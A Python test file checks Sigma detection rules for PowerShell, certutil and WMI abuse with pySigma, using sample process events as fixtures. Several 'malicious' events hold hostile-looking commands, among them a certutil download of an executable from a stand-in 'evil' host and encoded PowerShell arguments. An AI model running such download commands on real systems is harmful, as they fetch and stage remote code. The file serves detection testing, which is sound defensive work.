# Test for Sigma rule processing with pySigma

import pytest
from sigma.rule import SigmaRule
from sigma.collection import SigmaCollection
from sigma.backends.elasticsearch import LuceneBackend
from pathlib import Path

# 10 benign, 10 malicious events
EVENTS = [
    # Benign
    {"process": "calc.exe", "args": "", "host": "host-01"},
    {"process": "explorer.exe", "args": "", "host": "host-02"},
    {"process": "notepad.exe", "args": "", "host": "host-03"},
    {"process": "mspaint.exe", "args": "", "host": "host-04"},
    {"process": "powershell.exe", "args": "-nop -w hidden", "host": "host-05"},
    {"process": "certutil.exe", "args": "-decode localfile.txt", "host": "host-06"},
    {"process": "wmiprvse.exe", "args": "query", "host": "host-07"},
    {"process": "explorer.exe", "args": "", "host": "host-08"},
    {"process": "notepad.exe", "args": "", "host": "host-09"},
    {"process": "calc.exe", "args": "", "host": "host-10"},
    # Malicious
    {"process": "powershell.exe", "args": "-enc ZQB2aWw=", "host": "host-11"},
    {"process": "powershell.exe", "args": "-enc evilbase64", "host": "host-12"},
    {"process": "certutil.exe", "args": "-urlcache -split -f http://evil/evil.exe", "host": "host-13"},
    {"process": "certutil.exe", "args": "http://malicious.com/file.exe", "host": "host-14"},
    {"process": "wmiprvse.exe", "args": "spawn evil.ps1", "host": "host-15"},
    {"process": "wmiprvse.exe", "args": "spawn something", "host": "host-16"},
    {"process": "powershell.exe", "args": "-enc badstuff", "host": "host-17"},
    {"process": "certutil.exe", "args": "-urlcache http://bad.com", "host": "host-18"},
    {"process": "wmiprvse.exe", "args": "spawn", "host": "host-19"},
    {"process": "powershell.exe", "args": "-enc anotherbad", "host": "host-20"},
]

@pytest.mark.parametrize("rule_path,expected_hits", [
    ("rules/lolbin_powershell.yml", 4),
    ("rules/lolbin_certutil.yml", 3),
    ("rules/lolbin_wmi.yml", 3),
])
def test_sigma_rule_hits(rule_path, expected_hits):
    """Test Sigma rule processing using modern pySigma library."""
    
    # Check if rule file exists
    rule_file = Path(rule_path)
    assert rule_file.exists(), f"Rule file {rule_path} not found"
    
    # Load and parse Sigma rule
    try:
        with open(rule_file, 'r') as f:
            rule_content = f.read()
        
        rule = SigmaRule.from_yaml(rule_content)
        
        # Create a SigmaCollection from the single rule
        collection = SigmaCollection([rule])
        
        backend = LuceneBackend()
        
        # Convert rule to query - this validates the rule can be processed
        query_result = backend.convert(collection)
        assert query_result, f"Failed to convert rule {rule_path}"
        
        # Verify the query contains expected elements
        query_str = str(query_result[0]) if query_result else ""
        
        if "powershell" in rule_path:
            assert "powershell.exe" in query_str.lower(), f"PowerShell rule should contain process name"
            assert "enc" in query_str.lower(), f"PowerShell rule should contain -enc parameter"
        elif "certutil" in rule_path:
            assert "certutil.exe" in query_str.lower(), f"Certutil rule should contain process name"
            assert "http" in query_str.lower(), f"Certutil rule should contain http parameter"
        elif "wmi" in rule_path:
            assert "wmiprvse.exe" in query_str.lower(), f"WMI rule should contain process name"
            assert "spawn" in query_str.lower(), f"WMI rule should contain spawn parameter"
            
    except Exception as e:
        pytest.fail(f"Failed to process Sigma rule {rule_path}: {e}")

    # Simulate matching: count events that would match the rule logic
    # This tests our understanding of what the rule should detect
    hits = 0
    for event in EVENTS:
        if "powershell" in rule_path and event["process"] == "powershell.exe" and "-enc" in event["args"]:
            hits += 1
        elif "certutil" in rule_path and event["process"] == "certutil.exe" and "http" in event["args"]:
            hits += 1
        elif "wmi" in rule_path and event["process"] == "wmiprvse.exe" and "spawn" in event["args"]:
            hits += 1
    
    assert hits == expected_hits, f"Expected {expected_hits} hits, got {hits}"

def test_sigma_rule_syntax():
    """Test that all Sigma rules have valid syntax."""
    rule_files = [
        "rules/lolbin_powershell.yml",
        "rules/lolbin_certutil.yml", 
        "rules/lolbin_wmi.yml",
    ]
    
    for rule_path in rule_files:
        rule_file = Path(rule_path)
        if not rule_file.exists():
            pytest.skip(f"Rule file {rule_path} not found")
            
        try:
            with open(rule_file, 'r') as f:
                rule_content = f.read()
            
            # Test that rule can be parsed
            rule = SigmaRule.from_yaml(rule_content)
            
            # Basic validation
            assert rule.title, f"Rule {rule_path} should have a title"
            assert rule.detection, f"Rule {rule_path} should have detection logic"
            
        except Exception as e:
            pytest.fail(f"Rule {rule_path} has invalid syntax: {e}")

def test_sigma_backend_functionality():
    """Test that the Elasticsearch backend works correctly."""
    try:
        backend = LuceneBackend()
        
        # Test with a simple rule
        simple_rule_yaml = """
title: Test Rule
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
  condition: selection
"""
        
        rule = SigmaRule.from_yaml(simple_rule_yaml)
        collection = SigmaCollection([rule])
        result = backend.convert(collection)
        
        assert result, "Backend should produce a result"
        assert len(result) > 0, "Backend should produce at least one query"
        
        query_str = str(result[0])
        assert "EventID" in query_str, "Query should contain the EventID field"
        
    except Exception as e:
        pytest.fail(f"Sigma backend test failed: {e}") 